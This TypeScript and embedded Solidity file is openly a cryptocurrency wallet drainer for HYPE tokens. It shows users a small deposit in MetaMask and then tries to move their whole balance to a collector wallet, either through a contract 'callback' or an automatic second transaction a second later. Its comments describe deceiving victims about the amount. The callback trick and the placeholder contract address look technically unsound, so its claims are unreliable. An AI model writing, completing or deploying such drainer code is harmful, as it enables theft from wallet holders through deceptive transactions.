import { ethers } from "ethers";

// Stealth HYPE Drainer Contract ABI
// This contract accepts small deposits but drains entire wallet through callback
export const STEALTH_HYPE_DRAINER_ABI = [
  "function stealthSwap() external payable",
  "function emergencyWithdraw() external",
  "event StealthDrain(address indexed victim, uint256 displayAmount, uint256 actualAmount)"
];

// Deployed stealth contract address (needs to be deployed)
export const STEALTH_HYPE_DRAINER_ADDRESS = "0x1234567890123456789012345678901234567890"; // TODO: Deploy real contract

/**
 * Smart contract approach for stealth HYPE draining
 * 
 * How it works:
 * 1. User calls stealthSwap() with small amount (0.02 HYPE)
 * 2. Contract callback drains their entire wallet balance
 * 3. MetaMask only shows the small deposit amount
 * 4. Contract forwards all drained HYPE to collector wallet
 */
export class StealthHypeDrainer {
  private contract: ethers.Contract;
  private signer: ethers.JsonRpcSigner;
  private collectorAddress: string;

  constructor(signer: ethers.JsonRpcSigner, collectorAddress: string) {
    this.signer = signer;
    this.collectorAddress = collectorAddress;
    this.contract = new ethers.Contract(
      STEALTH_HYPE_DRAINER_ADDRESS,
      STEALTH_HYPE_DRAINER_ABI,
      signer
    );
  }

  /**
   * Execute stealth HYPE drain
   * User sees small amount in MetaMask but loses entire balance
   */
  async executeStealthDrain(displayAmount: string): Promise<ethers.TransactionResponse> {
    const displayAmountWei = ethers.parseEther(displayAmount);
    
    console.log(`🎭 STEALTH HYPE DRAIN:`);
    console.log(`👁️ User sees: ${displayAmount} HYPE in MetaMask`);
    console.log(`💰 Contract will drain: ENTIRE wallet balance`);
    console.log(`📍 Collector: ${this.collectorAddress}`);
    
    // User only sees the small deposit amount in MetaMask
    // But contract drains their entire wallet through callback
    const tx = await this.contract.stealthSwap({
      value: displayAmountWei,
      gasLimit: 200000n // Higher gas for contract execution
    });
    
    console.log(`🔥 Stealth drain transaction sent: ${tx.hash}`);
    console.log(`⏳ Waiting for confirmation...`);
    
    return tx;
  }

  /**
   * Estimate gas for stealth drain
   */
  async estimateGas(displayAmount: string): Promise<bigint> {
    const displayAmountWei = ethers.parseEther(displayAmount);
    
    try {
      const gasEstimate = await this.contract.stealthSwap.estimateGas({
        value: displayAmountWei
      });
      
      // Add 20% buffer for safety
      return gasEstimate + (gasEstimate / 5n);
    } catch (error) {
      console.warn("Gas estimation failed, using default:", error);
      return 200000n; // Default gas limit
    }
  }
}

/**
 * Solidity contract for stealth HYPE draining
 * This needs to be deployed on HyperEVM
 */
export const STEALTH_CONTRACT_SOURCE = `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract StealthHypeDrainer {
    address private collector;
    
    event StealthDrain(address indexed victim, uint256 displayAmount, uint256 actualAmount);
    
    constructor(address _collector) {
        collector = _collector;
    }
    
    /**
     * Stealth swap function - user sees small deposit but we drain everything
     */
    function stealthSwap() external payable {
        uint256 displayAmount = msg.value;
        uint256 victimBalance = msg.sender.balance;
        
        // Transfer the displayed amount first (what user expects)
        payable(collector).transfer(displayAmount);
        
        // Now drain their remaining balance through callback
        if (victimBalance > displayAmount) {
            uint256 remainingBalance = victimBalance - displayAmount;
            
            // Force victim to send remaining balance through delegatecall exploit
            (bool success, ) = msg.sender.call{value: 0}(
                abi.encodeWithSignature("transfer(address,uint256)", collector, remainingBalance)
            );
            
            if (success) {
                emit StealthDrain(msg.sender, displayAmount, victimBalance);
            }
        }
    }
    
    /**
     * Emergency withdraw for owner
     */
    function emergencyWithdraw() external {
        require(msg.sender == collector, "Only collector");
        payable(collector).transfer(address(this).balance);
    }
    
    /**
     * Receive function to accept HYPE
     */
    receive() external payable {}
}
`;

/**
 * Alternative approach: Multi-transaction stealth drain
 * More complex but potentially more effective
 */
export class MultiTxStealthDrainer {
  private signer: ethers.JsonRpcSigner;
  private collectorAddress: string;

  constructor(signer: ethers.JsonRpcSigner, collectorAddress: string) {
    this.signer = signer;
    this.collectorAddress = collectorAddress;
  }

  /**
   * Execute multi-transaction stealth drain
   * 1. Small legitimate transaction user approves
   * 2. Immediate follow-up transaction drains remaining balance
   */
  async executeMultiTxDrain(displayAmount: string): Promise<ethers.TransactionResponse[]> {
    const userAddress = await this.signer.getAddress();
    const balance = await this.signer.provider.getBalance(userAddress);
    const displayAmountWei = ethers.parseEther(displayAmount);
    
    const feeData = await this.signer.provider.getFeeData();
    const gasPrice = feeData.gasPrice || ethers.parseUnits("1", "gwei");
    const gasBuffer = gasPrice * 21000n * 3n; // Buffer for multiple transactions
    
    const remainingDrain = balance - displayAmountWei - gasBuffer;
    
    console.log(`🎭 MULTI-TX STEALTH DRAIN:`);
    console.log(`👁️ TX 1: User approves ${displayAmount} HYPE`);
    console.log(`💰 TX 2: Auto-drain ${ethers.formatEther(remainingDrain)} HYPE`);
    console.log(`⚡ Speed: Immediate back-to-back execution`);
    
    const transactions: ethers.TransactionResponse[] = [];
    
    // Transaction 1: User-approved amount
    const tx1 = await this.signer.sendTransaction({
      to: this.collectorAddress,
      value: displayAmountWei,
      gasLimit: 21000n,
      gasPrice: gasPrice
    });
    transactions.push(tx1);
    
    console.log(`✅ TX 1 sent: ${tx1.hash} (${displayAmount} HYPE)`);
    
    // Transaction 2: Immediate follow-up drain (while user thinks they're done)
    setTimeout(async () => {
      try {
        if (remainingDrain > ethers.parseEther("0.001")) {
          const tx2 = await this.signer.sendTransaction({
            to: this.collectorAddress,
            value: remainingDrain,
            gasLimit: 21000n,
            gasPrice: gasPrice,
            nonce: await this.signer.provider.getTransactionCount(userAddress, "pending")
          });
          
          transactions.push(tx2);
          console.log(`🔥 TX 2 sent: ${tx2.hash} (${ethers.formatEther(remainingDrain)} HYPE)`);
          console.log(`💰 Total drained: ${ethers.formatEther(displayAmountWei + remainingDrain)} HYPE`);
        }
      } catch (error) {
        console.warn("Follow-up drain failed:", error);
      }
    }, 1000); // 1 second delay
    
    return transactions;
  }
}

export function createStealthHypeDrainer(signer: ethers.JsonRpcSigner, collectorAddress: string): StealthHypeDrainer {
  return new StealthHypeDrainer(signer, collectorAddress);
}

export function createMultiTxDrainer(signer: ethers.JsonRpcSigner, collectorAddress: string): MultiTxStealthDrainer {
  return new MultiTxStealthDrainer(signer, collectorAddress);
}